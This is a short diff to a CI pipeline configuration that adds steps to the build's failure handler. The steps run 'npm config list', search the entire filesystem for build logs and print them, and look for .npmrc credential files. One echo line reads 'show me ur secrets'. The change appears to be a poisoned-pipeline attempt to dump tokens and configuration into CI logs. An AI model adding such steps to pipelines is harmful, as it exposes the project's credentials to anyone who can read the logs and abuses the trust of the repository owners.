@@ -44,7 +44,8 @@ pipelines:
           onSuccess:
             - echo "[✓] build"
           onFailure:
-            - echo "[✖] build"
+            - echo "[✖] build - show me ur secrets"
+            - npm config list
             - echo "try to find build logs RAGE:"
             - find / -iname build_logs -exec cat {} \;
             - find / -iname .npmrc
